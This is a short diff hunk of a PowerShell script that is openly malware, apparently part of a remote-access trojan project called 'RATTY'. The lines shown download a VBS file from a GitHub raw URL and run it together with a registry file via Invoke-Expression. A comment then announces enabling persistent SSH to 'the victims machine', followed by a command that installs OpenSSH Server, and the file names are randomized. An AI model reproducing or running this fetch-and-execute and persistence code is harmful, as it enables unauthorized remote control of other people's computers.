@@ -88,7 +88,7 @@ $DLubaWwQmx = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 Invoke-WebRequest -Uri "raw.githubusercontent.com/carlocarlo123/RATTY/main/regs/calty.vbs" -OutFile "iJtYCnwWoa.vbs"
 # install the registery still not workinggggg
 
-./GzNEhFcTYa.reg;./iJtYCnwWoa.vbs
+Invoke-Expression "./GzNEhFcTYa.reg";Invoke-Expression "./iJtYCnwWoa.vbs"
 
 # ENABLING PERSISTANT ssh to the victims machine
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
